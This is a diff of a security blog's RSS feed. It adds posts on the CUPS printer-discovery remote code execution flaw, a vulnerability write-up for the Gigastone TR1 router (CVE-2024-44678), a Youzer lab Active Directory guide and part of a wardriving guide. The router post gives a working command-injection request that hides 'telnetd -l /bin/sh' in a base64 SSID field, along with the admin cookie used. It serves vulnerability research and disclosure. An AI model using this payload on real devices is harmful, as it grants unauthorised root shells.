@@ -1,13 +1,1667 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on Smittix</title>
-        <link>http://localhost:1313/posts/</link>
+        <link>https://smittix.github.io/posts/</link>
         <description>Recent content in Posts on Smittix</description>
         <generator>Hugo -- gohugo.io</generator>
-        <language>en</language>
-        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 11 Apr 2025 11:49:34 +0100</lastBuildDate>
-        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        <language>en-us</language>
+        <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+        <lastBuildDate>Thu, 26 Sep 2024 00:00:00 +0000</lastBuildDate>
+        <atom:link href="https://smittix.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Summary of the CUPS Vulnerability</title>
+            <link>https://smittix.github.io/posts/summary-of-the-cups-vulnerability/</link>
+            <pubDate>Thu, 26 Sep 2024 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/summary-of-the-cups-vulnerability/</guid>
+            <description>&lt;hr&gt;
+&lt;p&gt;Affected Software:&lt;/p&gt;
+&lt;p&gt;Several components of the CUPS printing system, specifically &lt;code&gt;cups-browsed&lt;/code&gt;, &lt;code&gt;libppd&lt;/code&gt;, &lt;code&gt;libcupsfilters&lt;/code&gt;, and &lt;code&gt;cups-filters&lt;/code&gt;, in versions up to 2.0.1.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Discovered By&lt;/strong&gt;: Simone Margaritelli (@evilsocket)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Impact&lt;/strong&gt;: Allows remote code execution on the affected system.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;whats-the-problem&#34;&gt;What’s the Problem?&lt;/h3&gt;
+&lt;p&gt;This vulnerability stems from how the CUPS system discovers printers on a network. The issue lies in the &lt;code&gt;cups-browsed&lt;/code&gt; component, which automatically adds printers by scanning the network. Unfortunately, it doesn’t verify whether the discovered printer is legitimate or not. This lack of verification allows an attacker to inject a malicious printer into the system, which can then execute arbitrary commands.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<hr>
+<p>Affected Software:</p>
+<p>Several components of the CUPS printing system, specifically <code>cups-browsed</code>, <code>libppd</code>, <code>libcupsfilters</code>, and <code>cups-filters</code>, in versions up to 2.0.1.</p>
+<p><strong>Discovered By</strong>: Simone Margaritelli (@evilsocket)</p>
+<p><strong>Impact</strong>: Allows remote code execution on the affected system.</p>
+<hr>
+<h3 id="whats-the-problem">What’s the Problem?</h3>
+<p>This vulnerability stems from how the CUPS system discovers printers on a network. The issue lies in the <code>cups-browsed</code> component, which automatically adds printers by scanning the network. Unfortunately, it doesn’t verify whether the discovered printer is legitimate or not. This lack of verification allows an attacker to inject a malicious printer into the system, which can then execute arbitrary commands.</p>
+<p>Here’s how it works:</p>
+<ol>
+<li><strong>Printer Discovery</strong>: The <code>cups-browsed</code> service looks for printers using two protocols—UDP (on port 631) and DNS-SD/mDNS. It can receive responses from untrusted sources, even outside the local network, if exposed to the internet.</li>
+<li><strong>No Security Checks</strong>: Once a printer is discovered, <code>cups-browsed</code> automatically contacts it and fetches its properties. These properties are saved to a temporary file without any validation or sanitization.</li>
+<li><strong>Malicious Printer Properties</strong>: An attacker can trick the system by setting specific printer properties, such as <code>printer-privacy-policy-uri</code>, to include malicious code. This unsanitized data is saved into the temporary printer configuration file.</li>
+<li><strong>Code Execution</strong>: When a print job is sent to the malicious printer, the system executes the attacker’s code. This can be as simple as running a shell command that creates a file or, in more severe cases, opens the door to full system compromise.</li>
+</ol>
+<hr>
+<h3 id="how-an-attacker-can-exploit-it">How an Attacker Can Exploit It</h3>
+<p>An attacker can take advantage of this vulnerability by either:</p>
+<ul>
+<li><strong>Remote Attack</strong>: If the target system’s UDP port 631 is exposed to the internet, an attacker can remotely inject a malicious printer.</li>
+<li><strong>Local Network Attack</strong>: If the attacker is on the same network as the victim, they can use mDNS to perform the attack.</li>
+</ul>
+<p>Once the malicious printer is added to the system, any print job sent to it can trigger the execution of arbitrary commands.</p>
+<hr>
+<h3 id="example-exploit-scenario">Example Exploit Scenario</h3>
+<ul>
+<li>The attacker sets up a fake printer on the network, configured to respond with malicious data.</li>
+<li><code>cups-browsed</code> discovers the printer, automatically adds it, and saves its configuration without performing any checks.</li>
+<li>When the victim sends a print job, the attacker’s commands are executed on the target system, allowing them to take control.</li>
+</ul>
+<hr>
+<h3 id="fixing-the-vulnerability">Fixing the Vulnerability</h3>
+<p>To mitigate this issue:</p>
+<ol>
+<li><strong>Disable Unnecessary Printer Discovery</strong>: If you don’t need network printer discovery, consider disabling it by turning off <code>cups-browsed</code> or blocking port 631 on your firewall.</li>
+<li><strong>Apply Patches</strong>: The CUPS maintainers have been notified, and patches are likely to be released soon. Regularly check for updates and security patches from your distribution’s package manager.</li>
+<li><strong>Network Segmentation</strong>: Ensure that printers are on a separate, trusted network, and that port 631 is not exposed to the public internet.</li>
+</ol>
+<hr>
+<h3 id="conclusion">Conclusion</h3>
+<p>This vulnerability in CUPS could allow an attacker to run arbitrary code on your system simply by adding a malicious printer. It highlights the importance of sanitising network input and controlling access to network services like printers. Keep an eye out for security updates, and consider adjusting your printer settings if you’re using CUPS in a vulnerable environment.</p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/summary-of-the-cups-vulnerability/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/summary-of-the-cups-vulnerability/&amp;text=Summary%20of%20the%20CUPS%20Vulnerability">**</a> <a href="mailto:?subject=Summary%20of%20the%20CUPS%20Vulnerability&amp;body=/summary-of-the-cups-vulnerability/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/summary-of-the-cups-vulnerability/&amp;title=Summary%20of%20the%20CUPS%20Vulnerability">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/summary-of-the-cups-vulnerability/&amp;title=Summary%20of%20the%20CUPS%20Vulnerability">**</a> <a href="https://api.whatsapp.com/send?text=/summary-of-the-cups-vulnerability/&amp;title=Summary%20of%20the%20CUPS%20Vulnerability">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/summary-of-the-cups-vulnerability/&amp;title=Summary%20of%20the%20CUPS%20Vulnerability">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/">Rapidly Creating Fake Users in your Lab AD using Youzer</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Gigastone TR1 (CVE-2024-44678)</title>
+            <link>https://smittix.github.io/posts/gigastone-tr1-cve-2024-44678/</link>
+            <pubDate>Sun, 11 Aug 2024 11:49:34 +0100</pubDate>
+            
+            <guid>https://smittix.github.io/posts/gigastone-tr1-cve-2024-44678/</guid>
+            <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;So, I got sucked into the vortex of social media the other night and noticed these quirky little red thingies a few people were using to boost their WiFi range. After some detective work (thanks, Amazon!), I stumbled upon these tiny travel routers from Gigastone, and guess what? They were a steal, just £18.99 for a pair!&lt;/p&gt;
+
+    &lt;img src=&#34;https://smittix.github.io/images/gigastone1.png&#34;  class=&#34;center&#34;  style=&#34;display: block; margin: 0 auto; max-width: 80%; height: auto;&#34;  /&gt;
+
+
+&lt;p&gt;Naturally, I couldn&amp;rsquo;t resist snagging a couple. I mean, they practically screamed &amp;ldquo;hack me&amp;rdquo; for a tear-down post.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
+<p>So, I got sucked into the vortex of social media the other night and noticed these quirky little red thingies a few people were using to boost their WiFi range. After some detective work (thanks, Amazon!), I stumbled upon these tiny travel routers from Gigastone, and guess what? They were a steal, just £18.99 for a pair!</p>
+
+    <img src="/images/gigastone1.png"  class="center"  style="display: block; margin: 0 auto; max-width: 80%; height: auto;"  />
+
+
+<p>Naturally, I couldn&rsquo;t resist snagging a couple. I mean, they practically screamed &ldquo;hack me&rdquo; for a tear-down post.</p>
+<h2 id="lets-open-it-up">Let’s open it up!</h2>
+
+    <img src="/images/gigastone2.png"  class="center"  style="display: block; margin: 0 auto; max-width: 80%; height: auto;"  />
+
+
+<p>Upon opening the device which was really simple with a pry tool and took near to no effort I was happy to see a Serial Peripheral Interface (SPI) NOR Flash chip (Red Box) and what looked to be Universal Asynchronous Receiver / Transmitter **(**UART) connectivity (Yellow Box).</p>
+<h2 id="uart">UART</h2>
+<p>I managed to get a console via the UART connection using some dupont wires and a TTL USB to UART cable. However, no joy there as the shell that was provided was very limited and attempts to dump the firmware image was futile.</p>
+
+    <img src="/images/gigastone3.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<h2 id="spi">SPI</h2>
+<p>Let’s move on to the SPI chip and see if we can dump the firmware using my trusty BusPirate</p>
+
+    <img src="/images/gigastone4.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>After a little Google-fu I found the datasheet for this particular chip which had the pin-outs which enabled me to hook it up to the BusPirate which dumped the firmware successfully now I could have a rummage through the file-system.</p>
+
+    <img src="/images/gigastone5.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>I spent a few evenings going through things which turned out quite fruitful. The first one being that the router was using 202.96.209.5 for DNS which is owned by China Telecom and that just may be a concern to those of us that are privacy minded.</p>
+
+    <img src="/images/gigastone6.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>Secondly, there were a handful of scripts/binaries lurking around some in plain-text some needing a little persuasion by Ghidra.</p>
+<p>My initial infrastructure assessment of the device revealed nothing of significance except a web-server and DNS which is standard for a router.</p>
+<p>However, after running one of the scripts, the device unexpectedly rebooted, leaving me puzzled at first. It wasn’t until I investigated further that I discovered Telnetd had been enabled, confirmed by a quick port scan. How did that happen?</p>
+<p>Well, the following wget command was launched:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget --load-cookies cookies.txt <span style="color:#e6db74">&#34;&lt;http://192.168.16.254/cgi-bin/tr1.cgi?cgi=2&amp;mode=0&amp;ssid=YHRlbG5ldGQgLWwvYmluL3NoYA==&amp;ht=0&amp;channel=0&amp;dhcp=50&amp;static=0&amp;ip=0.0.0.0&amp;subnet=0.0.0.0&amp;gw=0.0.0.0&amp;pppmode=0&amp;pppusr=bnVsbA==&amp;ppppwd=bnVsbA==&amp;pwd=&gt;&#34;</span>
+</span></span></code></pre></div><p>The &lsquo;<code>wget</code>&rsquo; command appears to be being used to send a request to the device&rsquo;s web server to execute a specific CGI script (tr1.cgi) with various parameters. This command seems to be exploiting a feature or a bug in the CGI script to turn on telnet. Let&rsquo;s break down the command to understand how it&rsquo;s achieving this:</p>
+<h1 id="breaking-down-the-command">Breaking Down the Command</h1>
+<h3 id="wget-load-cookies-cookiestxt">wget &ndash;load-cookies cookies.txt:</h3>
+<p>This part of the command uses wget to send an HTTP request. The &ndash;load-cookies cookies.txt option tells wget to use the cookies stored in cookies.txt for the request. This might be necessary for authentication if the web server requires login credentials.</p>
+<h2 id="url-breakdown">URL Breakdown:</h2>
+<h3 id="base-url-http19216816254cgi-bintr1cgi">Base URL: <a href="http://192.168.16.254/cgi-bin/tr1.cgi">http://192.168.16.254/cgi-bin/tr1.cgi</a></h3>
+<p>This is the URL of the CGI script being accessed on the device&rsquo;s web server.</p>
+<h3 id="query-parameters">Query Parameters:</h3>
+<ul>
+<li><code>cgi=2</code>: This parameter likely specifies the type of action to be taken by the CGI script.</li>
+<li><code>mode=0</code>: This parameter specifies a mode, possibly indicating a specific operation within the CGI script.</li>
+<li><code>ssid=YHRlbG5ldGQgLWwvYmluL3NoYA==</code>:This parameter is Base64 encoded which we will go into shortly.</li>
+</ul>
+<p>Other parameters (<code>ht=0</code>, <code>channel=0</code>, <code>dhcp=50</code>, etc.) likely configure other settings, but they don&rsquo;t seem directly relevant to this vulnerability.</p>
+<h3 id="decoding-the-ssid-parameter">Decoding the <code>ssid</code> Parameter</h3>
+<p>The most crucial part of the command is the <code>ssid</code> parameter. Let&rsquo;s decode it:</p>
+<p>Input:
+<code>echo &quot;YHRlbG5ldGQgLWwvYmluL3NoYA==&quot; | base64 --decode</code></p>
+<p>Output:
+<code>telnetd -l /bin/sh</code></p>
+<p>This decoded string is a command to start the telnet daemon (<code>telnetd</code>) with the login shell set to <code>/bin/sh</code>. By including this command in the <code>ssid</code> parameter, the CGI script is tricked into executing it, thereby enabling telnet access.</p>
+<h3 id="how-it-works">How It Works</h3>
+<ol>
+<li><strong>CGI Script Vulnerability</strong>: The CGI script <code>tr1.cgi</code> seems to accept the <code>ssid</code> parameter and might execute it or use it in a way that leads to command execution.</li>
+<li><strong>Base64 Encoding</strong>: By encoding the command in Base64, it bypasses potential input validation checks.</li>
+<li><strong>Command Execution</strong>: When the web server processes the CGI script with the provided parameters, it decodes the <code>ssid</code> parameter and executes the embedded command, enabling telnet with <code>/bin/sh</code>.</li>
+</ol>
+<h3 id="cookie-ingredients">Cookie ingredients:</h3>
+<h3 id="cookiestxt">cookies.txt</h3>
+<p>Contents:
+<code>192.168.16.254 TRUE / FALSE 1590440637 TR1_ADMIN admin</code></p>
+<h3 id="breakdown-of-cookie-fields">Breakdown of Cookie Fields</h3>
+<ol>
+<li><strong><code>192.168.16.254</code></strong>:
+<strong>Domain</strong>: This indicates the domain for which the cookie is valid. In this case, it&rsquo;s <code>192.168.16.254</code>, which is likely the IP address of the device&rsquo;s web server.</li>
+<li><strong><code>TRUE</code></strong>:
+<strong>Include subdomains</strong>: This field specifies whether the cookie should be sent to subdomains of the domain. <code>TRUE</code> means it should be sent to subdomains.</li>
+<li><strong><code>/</code></strong>:
+<strong>Path</strong>: This indicates the URL path that must exist in the requested URL for the browser to send the Cookie header. <code>/</code> means the cookie is valid for the entire domain.</li>
+<li><strong><code>FALSE</code></strong>:
+<strong>Secure</strong>: This field specifies whether the cookie should only be sent over secure connections (HTTPS). <code>FALSE</code> means the cookie can be sent over both HTTP and HTTPS.</li>
+<li><strong><code>1590440637</code></strong>:
+<strong>Expiration time</strong>: This field represents the expiration time of the cookie in Unix time (seconds since January 1, 1970). <code>1590440637</code> corresponds to a specific date and time when the cookie will expire.</li>
+<li><strong><code>TR1_ADMIN</code></strong>:
+<strong>Name</strong>: This is the name of the cookie. In this case, it’s <code>TR1_ADMIN</code>.</li>
+<li><strong><code>admin</code></strong>:
+<strong>Value</strong>: This is the value of the cookie. In this case, it’s <code>admin</code>.</li>
+</ol>
+<h3 id="conclusion">Conclusion</h3>
+<p>The <code>wget</code> command is exploiting a vulnerability/feature in the CGI script of the device&rsquo;s web server to execute a command that starts the telnet daemon. This provides shell access to the device over the network.</p>
+<h2 id="seeing-it-in-action">Seeing it in Action</h2>
+<p>Ok, so I have the travel router on and ready to go, lets give it a quick port scan to see what ports are open before we execute the command.</p>
+
+    <img src="/images/gigastone7.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>As you can see no Telnet service is listening (Port 23)</p>
+<p>So let’s run the command detailed earlier in the article and show what happens</p>
+
+    <img src="/images/gigastone8.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>The router has just rebooted itself, lets re-run that port scan</p>
+
+    <img src="/images/gigastone9.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>Et Voila, the Telnet service is now magically listening on its default port of ‘23’</p>
+<p>Let’s connect to the Telnet service</p>
+
+    <img src="/images/gigastone10.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>We’re now connected without any user credentials having to be supplied. Let’s take a look around</p>
+
+    <img src="/images/gigastone11.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>I’ll send that off to the cracking rig along with the shadow file (which I won’t show) especially with how poor the password actually was. Users Admin and root had the same hash.</p>
+
+    <img src="/images/gigastone12.png"  class="center"  style="display: block; margin: 0 auto; max-width: 100%; height: auto;"  />
+
+
+<p>We’ve successfully logged in as root!</p>
+<p>I have sat here rummaging around the file-system and I’ve come up with many ways this vulnerability could be maliciously used which is why I have omitted certain pieces of detail within this article as I cannot foresee a firmware update being released any time soon.</p>
+<h1 id="responsible-disclosure">Responsible Disclosure</h1>
+<p>Gigastone were contacted multiple times via email to various departments none of which seemed interested in having a conversation around my research. After failing to respond to my last email I gave it a few weeks until I responded with a timeline for disclosure which I also didn’t have a response to. Since then Gigastone have discontinued this product from their website however you can still purchase these devices from well known online vendors.</p>
+<h1 id="further-links">Further Links</h1>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-44678">NIST National Vulnerability Database Entry</a></li>
+<li><a href="https://www.bridewell.com/insights/blogs/detail/cve-2024-44678-identified-vulnerability-in-gigastone-wi-fi-range-extenders">Bridewell Writeup</a></li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Rapidly Creating Fake Users in your Lab AD using Youzer</title>
+            <link>https://smittix.github.io/posts/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/</link>
+            <pubDate>Fri, 07 Jun 2019 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/</guid>
+            <description>&lt;h2 id=&#34;penetration-testing-lab&#34;&gt;Penetration Testing Lab&lt;/h2&gt;
+&lt;p&gt;Whether you have a fully virtual organisation consisting of several different machines or the odd virtualised box you’re using to explore or freshen up on certain skills. They’re great fun and an asset to any security tester.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://smittix.github.io/wp-content/uploads/2019/06/IMG_2874-1024x767.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Having your own lab is a great way to perform security testing techniques in a controlled environment.&lt;/p&gt;
+&lt;p&gt;If you’re attempting to build out a lab that replicates a real organisation it’s always good to do things properly. Let’s assume for this post that you’ve already built a Windows Domain Controller for your penetration testing lab.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="penetration-testing-lab">Penetration Testing Lab</h2>
+<p>Whether you have a fully virtual organisation consisting of several different machines or the odd virtualised box you’re using to explore or freshen up on certain skills. They’re great fun and an asset to any security tester.</p>
+<p><img src="/wp-content/uploads/2019/06/IMG_2874-1024x767.jpg" alt=""></p>
+<p>Having your own lab is a great way to perform security testing techniques in a controlled environment.</p>
+<p>If you’re attempting to build out a lab that replicates a real organisation it’s always good to do things properly. Let’s assume for this post that you’ve already built a Windows Domain Controller for your penetration testing lab.</p>
+<p>You now need to create those virtual employees within Active Directory. Creating a few different accounts here and there is a relatively easy task I agree, but what if you want your virtual organisation to consist of hundreds of different users in different departments or organisational units, especially with real–world passwords? Having an Active Directory full of users can be useful for a number of activities one being the extraction of NTDS.dit and practising cracking techniques on any hashes that it may contain.</p>
+<h2 id="enter-youzer">Enter Youzer</h2>
+<ul>
+<li><img src="/wp-content/uploads/2019/06/youzer.png" alt=""></li>
+</ul>
+<p>Creating hundreds or even thousands of users is now achievable quickly and simply thanks to a tool called <a href="https://github.com/SpiderLabs/youzer">Youzer</a>.</p>
+<p>Youzer was written by <a href="https://www.twitter.com/lorentzenman">Matt Lorentzen</a> an ex-colleague of mine and an absolute brain on legs he describes Youzer’s goal on its GitHub page –</p>
+<blockquote>
+</blockquote>
+<p>The goal of Youzer is to create information-rich Active Directory environments. This uses the python3 library ‘faker’ to generate random accounts.</p>
+<p>You can either supply a wordlist or have the passwords generated. The generated option is great for testing things like hashcat rule masks. Wordlist option is useful when wanting to supply a specific password list seeded into an environment, or to practice dictionary attacks.
+The output is a CSV and a PowerShell script where both can be copied to the target. When executed, the PowerShell script binds over LDAP so doesn’t rely on the newer Active Directory modules and creates each user object. Currently the OU’s need to exist, but this tool is a sub-project of ‘Labseed’ where the Active Directory structure will be created.</p>
+<p><a href="https://github.com/SpiderLabs/youzer">https://github.com/SpiderLabs/youzer</a></p>
+<h2 id="prerequisites">Prerequisites</h2>
+<p>Ok, so you want to give Youzer a try on your newly created Domain Controller for your lab? There are a few pre-requisites that we need to install before we can proceed.</p>
+<p>For our environment, I used Microsoft Windows 2012 for reasons. We also need to install the following.</p>
+<p>The first being Python 3 – <a href="https://www.python.org/ftp/python/3.7.3/python-3.7.3.exe">https://www.python.org/ftp/python/3.7.3/python-3.7.3.exe</a></p>
+<p><img src="/wp-content/uploads/2019/06/python3-variables.png" alt=""> Figure 1: When installing Python ensure you tick the box which says “Add Python to environment variables”</p>
+<p>Once Python3 has been successfully installed we need to install the “faker” python library by issuing the following command from a command shell/powershell instance.</p>
+<pre tabindex="0"><code>PS C:\Users\Administrator\&gt; pip3 install faker
+</code></pre><p><img src="/wp-content/uploads/2019/06/pip-install-faker.png" alt="">Figure 2: Installation of the Faker Python library</p>
+<p>Now the faker library is installed we can move on to grabbing a password list for Youzer to utilise when generating the users passwords.</p>
+<p>A good place to start is <a href="https://twitter.com/danielmiessler">Daniel Miessler’s</a> github which has a great selection of <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials">Common Passwords</a>. When using Youzer for the first time I grabbed the <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/probable-v2-top12000.txt">Probable Top 12000</a>.</p>
+<h2 id="generating-users">Generating Users</h2>
+<p>We’re now ready to start generating Youzers (see what I did there?), hopefully, by now you have created some organisational units within Active Directory. I created IT, Sales and Management OU’s for our company’s training environment.</p>
+<p><img src="/wp-content/uploads/2019/06/evilcorp-ou.png" alt="">Figure 3: The newly created Sales OU</p>
+<p>Let’s fire up Youzer and give it some parameters which I will explain…</p>
+<pre tabindex="0"><code>PS C:\Users\Administrator\Downloads\youzer-master\&gt; python youzer.py --wordlist probable-v2-top12000.txt --ou &#34;ou=Sales,dc=EVILCORP,dc=local&#34; --domain EVILCORP --users 500 --output sales-users.csv
+</code></pre><p>Above we’ve run the Youzer script telling it the following:</p>
+<p><strong>–wordlist</strong> – Where our password list is located</p>
+<p><strong>–ou</strong> – The path to our Active Directory Organisational Unit</p>
+<p><strong>–domain</strong> – Our Domain</p>
+<p><strong>–users</strong> – How many users we’d like to generate</p>
+<p><strong>–output</strong> – The name of the CSV file we want to dump the data into, Youzer will then create a PowerShell script of the same name for you to run.</p>
+<p>Youzer should have now generated your fake users.</p>
+<p><img src="/wp-content/uploads/2019/06/user-gen.png" alt="">Figure 4: Youzer being run from our PowerShell prompt.</p>
+<p>Our output file should have also been populated with all of our newly generated users, Youzer would have also generated a PowerShell script to automate the task of taking these users and populating Active Directory.</p>
+<p><img src="/wp-content/uploads/2019/06/users-csv.png" alt="">Figure 6: Our newly created sales-users.csv</p>
+<h2 id="populating-active-directory">Populating Active Directory</h2>
+<p>Now our users have been generated and the needed files created we can go ahead and launch the PowerShell script which Youzer created for us in order to populate our Active Directory.</p>
+<pre tabindex="0"><code>PS C:\Users\Administrator\Downloads\youzer-master&gt; .\sales-users.ps1
+</code></pre><p><img src="/wp-content/uploads/2019/06/user-gen2-1.png" alt="">Figure 7: Youzer populating Active Directory</p>
+<p>Voila, 500 users created with passwords supplied via our wordlist in a matter of minutes.</p>
+<p><img src="/wp-content/uploads/2019/06/populated-ad.png" alt="">Figure 8: Populated Active Directory</p>
+<p>That brings us to the end of this post, I hope you found the information valuable the tool really does save time and has great potential. Having spoken to Matt Lorentzen he has some great plans coming in the near future so make sure to star the project in GitHub and keep up to date with any new developments.</p>
+<p>Until next time.</p>
+<h3 id="about-the-author">About The Author</h3>
+<ul>
+<li>
+<p><a href="/"></a></p>
+<p><a href="https://www.facebook.com/sharer.php?u=/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/">**</a> <a href="http://twitter.com/share?url=https://smittix.github.io/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/&amp;text=Rapidly%20Creating%20Fake%20Users%20in%20your%20Lab%20AD%20using%20Youzer">**</a> <a href="mailto:?subject=Rapidly%20Creating%20Fake%20Users%20in%20your%20Lab%20AD%20using%20Youzer&amp;body=/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/">**</a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/&amp;title=Rapidly%20Creating%20Fake%20Users%20in%20your%20Lab%20AD%20using%20Youzer">**</a> <a href="">**</a> <a href="https://t.me/share/url?url=https://smittix.github.io/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/&amp;title=Rapidly%20Creating%20Fake%20Users%20in%20your%20Lab%20AD%20using%20Youzer">**</a> <a href="https://api.whatsapp.com/send?text=/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/&amp;title=Rapidly%20Creating%20Fake%20Users%20in%20your%20Lab%20AD%20using%20Youzer">**</a> <a href="https://www.reddit.com/submit?url=https://smittix.github.io/rapidly-creating-fake-users-in-your-lab-ad-using-youzer/&amp;title=Rapidly%20Creating%20Fake%20Users%20in%20your%20Lab%20AD%20using%20Youzer">**</a> <a href="">**</a></p>
+</li>
+</ul>
+<h2 id="post-navigation">Post navigation</h2>
+<p><a href="/posts/wardriving-with-kismet-gps-and-google-earth/">Wardriving with Kismet, GPS and Google Earth.</a><a href="/posts/summary-of-the-cups-vulnerability/">Summary of the CUPS Vulnerability</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Wardriving with Kismet, GPS and Google Earth.</title>
+            <link>https://smittix.github.io/posts/wardriving-with-kismet-gps-and-google-earth./</link>
+            <pubDate>Tue, 05 Mar 2019 00:00:00 +0000</pubDate>
+            
+            <guid>https://smittix.github.io/posts/wardriving-with-kismet-gps-and-google-earth./</guid>
+            <description>&lt;p&gt;Wardriving was once a really popular sport, I myself loved mapping new areas with my trusty Orinco Gold Card. I’m not sure how popular it is these days but I thought I’d write this guide as I came across my GPS dongle and got set it up in Kali Rolling. I then processed the results and dumped them into a usable format which you can then import into Google Earth. As with all of my guides I hope at least one person finds it useful.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<p>Wardriving was once a really popular sport, I myself loved mapping new areas with my trusty Orinco Gold Card. I’m not sure how popular it is these days but I thought I’d write this guide as I came across my GPS dongle and got set it up in Kali Rolling. I then processed the results and dumped them into a usable format which you can then import into Google Earth. As with all of my guides I hope at least one person finds it useful.</p>
+<h2 id="the-hardware">The Hardware</h2>
+<p>This was all setup on a Lenovo thinkpad with the Kali Rolling distribution, I used the following Wireless and GPS adapters which I’ve also included an Amazon link just in case you wanted to purchase them.</p>
+<h2 id="wireless-adapter">Wireless Adapter</h2>
+<p>I use an <strong>Alfa AWUS036NHA</strong> which has an Atheros AR9271 chipset and is well supported in Linux it also supports packet injection</p>
+<p><img src="https://i1.wp.com/stealingthe.network/wp-content/uploads/2019/03/617wm7-itL._SL1500_-1.jpg?fit=750%2C750&amp;ssl=1" alt=""></p>
+<p><strong>Amazon</strong> – <a href="https://www.amazon.co.uk/Network-AWUS036NHA-Adapter-150-Mbps-802-11b/dp/B004Y6MIXS/ref=sr_1_3?ie=UTF8&amp;qid=1551723601&amp;sr=8-3&amp;keywords=alfa+awus036nh%EF%BB%BF">LINK</a></p>
+<h2 id="gps-receiver">GPS Receiver</h2>
+<hr>
+<p>For the GPS side of things I chose to use the <strong>GlobalSat BU-353-S4 receiver</strong>. Purely because it’s well supported under Linux and Kismet.</p>
+<p><img src="https://i1.wp.com/stealingthe.network/wp-content/uploads/2019/03/GlobalSat-BU353-S4_-1.jpg?fit=750%2C784&amp;ssl=1" alt=""></p>
+<p>**Amazon **– <a href="https://www.amazon.co.uk/GlobalSat-BU-353-S4-Receiver-SiRF-Black/dp/B008200LHW/ref=sr_1_1?ie=UTF8&amp;qid=1551724582&amp;sr=8-1&amp;keywords=globalsat+bu-353-s4+usb+gps+receiver%EF%BB%BF">Link</a></p>
+<h2 id="setting-up-the-devices">Setting up the devices</h2>
+<p>There are some prerequisites we will need to install to get the GPS working which are not installed by default.</p>
+<pre tabindex="0"><code>root@Hunter~# apt install gpsd gpsd-clients
+</code></pre><p>Once we have those installed we’re pretty much good to go. Go ahead and plug in your GPS receiver and run the following. My device was located at <strong>/dev/ttyUSB0</strong> but yours maybe different so please check.</p>
+<pre tabindex="0"><code>root@hunter~# gpsd -n -N -D 2 /dev/ttyUSB0
+</code></pre><ul>
+<li><strong>-n</strong> Don’t wait for a client to connect before polling whatever GPS is associated with it. Some RS232 GPSes wait in a standby mode (drawing less power) when the host machine is not asserting DTR, and some cellphone and handheld embedded GPSes have similar behaviors. Accordingly, waiting for a watch request to open the device may save battery power. (This capability is rare in consumer-grade devices).</li>
+<li><strong>-N</strong> Don’t daemonize; run in foreground. This switch is mainly useful for debugging.</li>
+<li><strong>-D 2</strong> Set debug level. At debug levels 2 and above, gpsd reports incoming sentence and actions to standard error if gpsd is in the foreground (-N) or to syslog if in the background.</li>
+</ul>
+<p><img src="/wp-content/uploads/2019/03/GPS-KISMET-3.png" alt="">GPSD up and running with debugging level set to 2.</p>
